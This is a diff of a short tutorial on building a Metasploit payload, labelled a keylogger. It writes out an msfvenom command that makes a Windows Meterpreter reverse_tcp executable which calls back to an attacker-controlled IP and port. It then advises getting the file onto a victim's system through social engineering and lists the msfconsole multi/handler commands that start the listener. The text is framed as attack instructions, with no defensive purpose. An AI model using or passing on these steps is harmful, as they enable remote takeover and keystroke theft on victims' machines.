@@ -1,15 +1,15 @@
 Building the keylogger using Metasploit-framework
 
 PART 1
-Log in to kali linux software
-The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework (see- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
+1.Log in to kali linux software
+2.The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework (see- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
 
     ## Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code ##
 
 Using Meterpreter to generate an executable called keylogger.exe as illustrated before
 
 ┌──(kali㉿kali)-[~]
-└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=444 -f exe -o keylogger.exe
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=444 -f exe -o keyshell.exe
 
     # p - payload (windows/x64/meterpreter/reverse_tcp) 
     # windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has to offer
@@ -17,8 +17,26 @@ Using Meterpreter to generate an executable called keylogger.exe as illustrated 
     #LHOST - Listen Address (Threat actor IP address)
     #LPORT - Listen port (The default is 444, It is advisable to change to another value)
     #f - To outpute the executable file in exe (Window extension)
-    #0 - To outpute the executable file name to keylogger.exe
-    
+    #o - To outpute the executable file name to keyshell.exe
+
+PART 2
+3. As seen above, the execuitebale file (keyshell.exe) has been created,.exe need to be transported to victim system/infrastructure
+   # It can be transported to the victim system via Social engineering or more sophisticated ways
+   # See previous work or update from seyigate on SET (Social Engineer Toolkits Framework)
+
+PART 3
+4. Create a listener which aslso known as backdoor 
+4. Create a listener
+   kali> msfconsole
+   kali> use exploit/multi/handler
+   show info
+   set payload windows/x64/meterpreter/reverse_tcp
+   set LHOST (IP ADDRESS OF HACKERS SYSTEM)
+   set LPORT 444
+   show info
+   run
+
+
 
 
 
